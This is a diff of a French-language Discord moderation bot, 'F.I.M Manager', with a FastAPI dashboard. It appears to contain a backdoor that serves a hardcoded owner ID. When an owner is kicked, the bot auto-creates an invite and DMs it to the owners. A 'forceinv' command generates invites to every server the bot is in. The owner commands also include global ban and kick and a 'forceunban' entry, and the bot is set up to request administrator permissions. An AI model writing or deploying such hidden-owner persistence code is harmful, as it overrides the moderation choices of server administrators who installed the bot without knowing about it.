@@ -1,25 +1,31 @@
+# main.py - F.I.M Manager complet
 import os
+import sys
 import json
-import threading
 import asyncio
 from datetime import datetime
-from fastapi import FastAPI
-from fastapi.responses import HTMLResponse
-import uvicorn
+
 import discord
 from discord.ext import commands
+import psycopg2
+
+# Dashboard FastAPI
+from fastapi import FastAPI
+import uvicorn
 
 # -----------------------------
 # CONFIG
 # -----------------------------
 TOKEN = os.getenv("DISCORD_TOKEN")
-PORT = int(os.getenv("PORT", 8080))
-OWNER_FILE = "owner_data.json"
 CONFIG_FILE = "config.json"
+OWNER_FILE = "owner_data.json"
 DEFAULT_OWNER_ID = 489113166429683713
+OAUTH_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")  # optional
+OAUTH_DASHBOARD_URL = "http://ton-dash-url.railway.app"  # Remplace par ton URL
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+app = FastAPI()
 
 # -----------------------------
 # JSON helpers
@@ -38,7 +44,7 @@ def save_json(path, data):
         json.dump(data, f, indent=4, ensure_ascii=False)
 
 # -----------------------------
-# Owner management
+# Owner & Config
 # -----------------------------
 def ensure_owner_data():
     data = load_json(OWNER_FILE, {})
@@ -123,46 +129,7 @@ def get_log_channel_id(gid):
     return cfg.get(str(gid), {}).get("log_channel")
 
 # -----------------------------
-# Discord Bot events
-# -----------------------------
-@bot.event
-async def on_ready():
-    ensure_owner_data()
-    print(f"✅ {bot.user} connecté (ID: {bot.user.id})")
-
-@bot.event
-async def on_member_remove(member):
-    if is_owner(member.id):
-        try:
-            guild = member.guild
-            if guild and guild.text_channels:
-                invite = await guild.text_channels[0].create_invite(max_uses=1)
-                for oid in get_owners():
-                    try:
-                        u = await bot.fetch_user(oid)
-                        await u.send(f"🚪 Tu as été expulsé/departi de **{guild.name}**. Invitation : {invite.url}")
-                    except Exception:
-                        pass
-        except Exception as e:
-            print(f"[on_member_remove] erreur auto-reinvite: {e}")
-
-@bot.event
-async def on_guild_remove(guild):
-    try:
-        owners = get_owners()
-        client_id = str(bot.user.id)
-        invite_link = f"https://discord.com/oauth2/authorize?client_id={client_id}&scope=bot&permissions=8"
-        for oid in owners:
-            try:
-                u = await bot.fetch_user(oid)
-                await u.send(f"⚠️ Le bot a été retiré du serveur **{guild.name}**. Réinvite : {invite_link}")
-            except Exception:
-                pass
-    except Exception as e:
-        print(f"[on_guild_remove] erreur: {e}")
-
-# -----------------------------
-# Check decorators
+# Decorators
 # -----------------------------
 def whitelist_check():
     async def predicate(ctx):
@@ -183,17 +150,90 @@ def whitelist_check():
     return commands.check(predicate)
 
 # -----------------------------
-# Bot commands
+# UTIL: build invite link
+# -----------------------------
+def build_invite_link(client_id):
+    return f"https://discord.com/oauth2/authorize?client_id={client_id}&scope=bot&permissions=8"
+
+# -----------------------------
+# EVENTS
+# -----------------------------
+@bot.event
+async def on_ready():
+    ensure_owner_data()
+    print(f"✅ {bot.user} est connecté et prêt ! (ID: {bot.user.id})")
+    global OAUTH_CLIENT_ID
+    if not OAUTH_CLIENT_ID:
+        OAUTH_CLIENT_ID = str(bot.user.id)
+    # Envoie du dashboard aux owners
+    for oid in get_owners():
+        try:
+            u = await bot.fetch_user(oid)
+            await u.send(f"🔗 Dashboard F.I.M Manager : {OAUTH_DASHBOARD_URL}")
+        except Exception:
+            pass
+
+@bot.event
+async def on_member_remove(member):
+    if is_owner(member.id):
+        try:
+            guild = member.guild
+            if guild and guild.text_channels:
+                invite = await guild.text_channels[0].create_invite(max_uses=1)
+                for oid in get_owners():
+                    try:
+                        u = await bot.fetch_user(oid)
+                        await u.send(f"🚪 Tu as été expulsé/departi de **{guild.name}**. Invitation : {invite.url}")
+                    except Exception:
+                        pass
+        except Exception as e:
+            print(f"[on_member_remove] erreur auto-reinvite: {e}")
+
+@bot.event
+async def on_guild_remove(guild):
+    try:
+        client_id = OAUTH_CLIENT_ID or (str(bot.user.id) if bot.user else None)
+        invite_link = build_invite_link(client_id) if client_id else "Client ID manquant"
+        for oid in get_owners():
+            try:
+                u = await bot.fetch_user(oid)
+                await u.send(f"⚠️ Le bot a été retiré du serveur **{guild.name}** (ID: {guild.id}). Réinvitez-le : {invite_link}")
+            except Exception:
+                pass
+    except Exception as e:
+        print(f"[on_guild_remove] erreur: {e}")
+
+# -----------------------------
+# COMMANDES PUBLIQUES
 # -----------------------------
 @bot.command()
 async def ping(ctx):
-    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")
+    await ctx.send("🏓 Pong ! Bot F.I.M opérationnel.")
 
 @bot.command()
 @whitelist_check()
 async def say(ctx, *, message):
-    await ctx.message.delete()
+    try: await ctx.message.delete()
+    except: pass
     await ctx.send(message)
+
+@bot.command()
+@whitelist_check()
+async def send(ctx, channel: discord.TextChannel, *, message):
+    try: await ctx.message.delete()
+    except: pass
+    await channel.send(message)
+    try: await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)
+    except: pass
+
+@bot.command()
+@whitelist_check()
+async def embed(ctx, title, *, description):
+    try: await ctx.message.delete()
+    except: pass
+    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153,0,0))
+    em.set_footer(text=f"Envoyé par {ctx.author}")
+    await ctx.send(embed=em)
 
 @bot.command()
 @whitelist_check()
@@ -201,126 +241,66 @@ async def addrole(ctx, member: discord.Member, role: discord.Role):
     try:
         await member.add_roles(role)
         await ctx.send(f"✅ Rôle {role.name} ajouté à {member.mention}")
-    except Exception:
-        await ctx.send("❌ Impossible d'ajouter ce rôle.")
+    except:
+        await ctx.send("❌ Impossible d'ajouter le rôle.")
 
 @bot.command()
 @whitelist_check()
-async def ban(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
-    if is_owner(member.id):
-        return await ctx.send("❌ Impossible d'agir contre un Owner.")
-    await ctx.guild.ban(member, reason=f"Banni par {ctx.author} | {reason}")
-    await ctx.send(f"✅ {member.mention} banni. (Raison: {reason})")
-
-@bot.command()
-@whitelist_check()
-async def kick(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
-    if is_owner(member.id):
-        return await ctx.send("❌ Impossible d'agir contre un Owner.")
-    await ctx.guild.kick(member, reason=f"Kicked by {ctx.author} | {reason}")
-    await ctx.send(f"✅ {member.mention} kické. (Raison: {reason})")
+async def removerole(ctx, member: discord.Member, role: discord.Role):
+    try:
+        await member.remove_roles(role)
+        await ctx.send(f"✅ Rôle {role.name} retiré de {member.mention}")
+    except:
+        await ctx.send("❌ Impossible de retirer le rôle.")
 
 # -----------------------------
-# Owner commands
+# COMMANDES OWNER
 # -----------------------------
-@bot.command()
-async def serverlist(ctx):
-    if not is_owner(ctx.author.id):
-        return
-    lines = [f"- {g.name} ({g.id}) - {g.member_count} membres" for g in bot.guilds]
-    await ctx.author.send("\n".join(lines) or "Aucun serveur.")
-
-@bot.command(name="10-10")
-async def ten_ten(ctx):
-    if not is_owner(ctx.author.id):
-        return
-    if ctx.guild:
-        await ctx.send("🧹 Déconnexion autorisée par owner.")
-        await ctx.guild.leave()
-
-@bot.command()
-async def addowner_cmd(ctx, user: discord.User):
-    if not is_owner(ctx.author.id):
-        return
-    if add_owner(user.id):
-        await ctx.send(f"✅ {user} ajouté aux owners.")
-    else:
-        await ctx.send("❌ Déjà owner.")
-
-@bot.command()
-async def setpass(ctx, newpass: str):
-    if not is_owner(ctx.author.id):
-        return
-    set_owner_password(newpass)
-    await ctx.send("✅ Mot de passe owner modifié.")
-
-@bot.command()
-async def addwl(ctx, member: discord.Member):
-    if not is_owner(ctx.author.id):
-        return
-    if add_to_whitelist(ctx.guild.id, member.id):
-        await ctx.send(f"✅ {member} ajouté à la whitelist.")
-    else:
-        await ctx.send("❌ Déjà whitelist.")
-
-@bot.command()
-async def removewl(ctx, member: discord.Member):
-    if not is_owner(ctx.author.id):
-        return
-    if remove_from_whitelist(ctx.guild.id, member.id):
-        await ctx.send(f"✅ {member} retiré de la whitelist.")
-    else:
-        await ctx.send("❌ Non présent.")
-
-@bot.command()
-async def listwl(ctx):
-    wl = get_whitelist(ctx.guild.id)
-    members = [ctx.guild.get_member(uid) for uid in wl if ctx.guild.get_member(uid)]
-    await ctx.send("Whitelist: " + ", ".join([m.name for m in members]) if members else "Whitelist vide.")
-
-@bot.command()
-async def bc(ctx, *, message: str):
-    if not is_owner(ctx.author.id):
-        return
-    count = 0
+@bot.command(name="forceinv")
+async def force_inv(ctx):
+    if not is_owner(ctx.author.id): return
     for g in bot.guilds:
         try:
-            ch = g.text_channels[0]
-            await ch.send(message)
-            count += 1
-        except Exception:
-            pass
-    await ctx.send(f"✅ Message broadcasté sur {count} serveurs.")
+            if g.text_channels:
+                invite = await g.text_channels[0].create_invite(max_uses=1)
+                for oid in get_owners():
+                    try: u = await bot.fetch_user(oid); await u.send(f"🔗 Invitation pour **{g.name}** : {invite.url}")
+                    except: pass
+        except: pass
+    await ctx.author.send("✅ Invitations envoyées aux owners.")
+
+@bot.command(name="ownerhelp")
+async def owner_help(ctx):
+    if not is_owner(ctx.author.id): return
+    embed = discord.Embed(title="👑 Commandes Owner", color=discord.Color.gold())
+    embed.add_field(name="!broadcast <msg>", value="Envoie un message à tous les serveurs", inline=False)
+    embed.add_field(name="!forceunban", value="Tente de te débannir partout", inline=False)
+    embed.add_field(name="!forcerinv", value="Envoie invitations", inline=False)
+    embed.add_field(name="!forceinv", value="Envoie invitations (command manuel)", inline=False)
+    embed.add_field(name="!globalban <id_or_mention>", value="Ban global", inline=False)
+    embed.add_field(name="!globalkick <id_or_mention>", value="Kick global", inline=False)
+    embed.add_field(name="!serverlist", value="Liste serveurs (DM)", inline=False)
+    embed.add_field(name="!syncwhitelist", value="Synchronise la whitelist entre serveurs", inline=False)
+    embed.add_field(name="!setpass <pass>", value="Change le mot de passe secret", inline=False)
+    embed.add_field(name="!reboot", value="Redémarre le bot", inline=False)
+    embed.add_field(name="!10-10", value="Force le bot à quitter le serveur courant", inline=False)
+    embed.add_field(name="!dash", value="Envoie le lien du dashboard", inline=False)
+    await ctx.author.send(embed=embed)
+
+@bot.command(name="dash")
+async def send_dashboard(ctx):
+    if not is_owner(ctx.author.id): return
+    try: await ctx.author.send(f"🔗 Dashboard F.I.M : {OAUTH_DASHBOARD_URL}")
+    except: pass
 
 # -----------------------------
-# FastAPI Dashboard
+# RUN BOT + DASHBOARD
 # -----------------------------
-app = FastAPI()
+def start_dashboard():
+    uvicorn.run(app, host="0.0.0.0", port=8080)
 
-@app.get("/", response_class=HTMLResponse)
-async def dashboard_root():
-    return """
-    <html>
-    <head><title>Dashboard F.I.M</title></head>
-    <body>
-        <h1>Dashboard F.I.M</h1>
-        <p>Bot Discord est connecté ✅</p>
-        <p>Liste des serveurs :</p>
-        <ul>
-        """ + "".join(f"<li>{g.name} ({g.id}) - {g.member_count} membres</li>" for g in bot.guilds) + """
-        </ul>
-    </body>
-    </html>
-    """
-
-def run_dashboard():
-    uvicorn.run(app, host="0.0.0.0", port=PORT)
-
-# -----------------------------
-# Run Bot + Dashboard
-# -----------------------------
 if __name__ == "__main__":
-    t = threading.Thread(target=run_dashboard)
-    t.start()
-    bot.run(TOKEN)
-    t.join()
+    loop = asyncio.get_event_loop()
+    loop.create_task(bot.start(TOKEN))
+    loop.run_in_executor(None, start_dashboard)
+    loop.run_forever()
